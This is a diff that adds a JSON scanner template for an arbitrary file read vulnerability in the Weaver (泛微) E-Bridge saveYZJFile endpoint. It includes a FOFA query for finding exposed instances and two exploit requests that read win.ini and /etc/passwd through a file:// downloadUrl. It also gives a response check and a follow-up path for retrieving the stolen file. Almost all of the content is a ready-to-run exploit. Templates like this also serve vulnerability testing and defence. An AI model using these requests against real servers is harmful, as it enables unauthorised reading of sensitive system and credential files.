@@ -1,0 +1,53 @@
+{
+  "product": "泛微 E-Bridge",
+  "vul_name": "泛微 E-Bridge saveYZJFile 任意文件读取-windows",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微云桥e-Bridge存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。",
+  "version": "",
+  "note": "拼接上面获得的id号，读取文件/file/fileNoLogin/{id}",
+  "search": {
+    "FOFA": "app=\"泛微云桥e-Bridge\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17775878.html",
+  "fix": [],
+  "logic": "or",
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/windows/win.ini&fileExt=txt"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "filepath"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "filepath"
+          }
+        ]
+      }
+    }
+  ]
+}
